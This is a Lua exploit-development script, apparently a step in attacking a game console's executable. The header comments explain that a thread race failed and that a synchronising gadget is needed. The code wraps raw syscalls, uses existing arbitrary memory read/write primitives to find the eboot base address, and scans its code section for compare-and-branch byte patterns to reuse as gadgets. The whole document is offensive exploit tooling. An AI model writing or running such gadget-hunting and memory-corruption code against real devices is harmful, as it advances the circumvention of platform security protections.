-- CRASH_CLASS: LOW
-- PROBE 913a: the child never overlaps the parent (64/64 ESRCH in 912a) because
-- thr_create returns before the child starts. A synchronising gadget is needed:
-- child spins on a flag word until the parent stores to it. Scan eboot .text for
-- cmp/branch forms that can implement that wait.
print("=== PROBE 913a: sync gadget scan ===")
local function to_num(v)
    if type(v)=="table" then
        if v.tonumber then local n=v:tonumber() if n then return n end end
        if v.h then return v.h*4294967296+v.l end
    end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local info=memory.alloc(0x200); wd(info,0x160)
pcall(function() mk(593)(uint64(0),uint64(info)) end)
local ebase=(rd(info+0x10C) or 0)*4294967296+(rd(info+0x108) or 0)
print(string.format("[0] eboot base=%X",ebase))
local pats={
  {"cmp_dword_rdi_0_je",  string.char(0x83,0x3F,0x00,0x74)},
  {"cmp_dword_rdi_0_jne", string.char(0x83,0x3F,0x00,0x75)},
  {"mov_eax_rdi_test_je", string.char(0x8B,0x07,0x85,0xC0,0x74)},
  {"mov_rax_rdi_test_je", string.char(0x48,0x8B,0x07,0x48,0x85,0xC0,0x74)},
  {"cmp_qword_rdi_0_je",  string.char(0x48,0x83,0x3F,0x00,0x74)},
  {"cmp_dword_rax_0_je",  string.char(0x83,0x38,0x00,0x74)},
}
local function scan(pat,limit,hits)
    local off=0
    while off<limit do
        local want=limit-off; if want>0x1000 then want=0x1000 end
        local ok,s=pcall(function() return memory.read_buffer(ebase+off,want) end)
        if not ok or type(s)~="string" then break end
        local pos=1
        while true do
            local i=string.find(s,pat,pos,true)
            if not i then break end
            hits[#hits+1]=ebase+off+i-1
            if #hits>=4 then return end
            pos=i+1
        end
        off=off+want
    end
end
for _,p in ipairs(pats) do
    local hits={}
    scan(p[2],0x494000,hits)
    for i,a in ipairs(hits) do
        local b=pcall(function() return memory.read_buffer(a,8) end)
        local ok,bytes=pcall(function() return memory.read_buffer(a,8) end)
        local hex=""
        if ok and type(bytes)=="string" then
            for k=1,#bytes do hex=hex..string.format("%02X ",string.byte(bytes,k)) end
        end
        print(string.format("  %s @ %X : %s",p[1],a,hex))
    end
    if #hits==0 then print("  "..p[1].." : none") end
end
